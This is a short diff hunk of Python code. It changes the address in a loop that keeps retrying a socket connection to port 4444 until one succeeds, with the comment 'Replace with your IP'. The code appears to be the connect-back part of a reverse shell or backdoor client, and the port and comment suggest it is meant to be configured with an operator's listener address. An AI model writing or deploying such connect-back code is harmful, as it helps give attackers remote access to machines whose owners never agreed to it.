@@ -30,7 +30,7 @@ def commands():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     while True:
         try:
-            s.connect(('192.168.239.128', 4444))  # Replace with your IP
+            s.connect(('127.0.0.1', 4444))  # Replace with your IP
             break
         except:
             pass
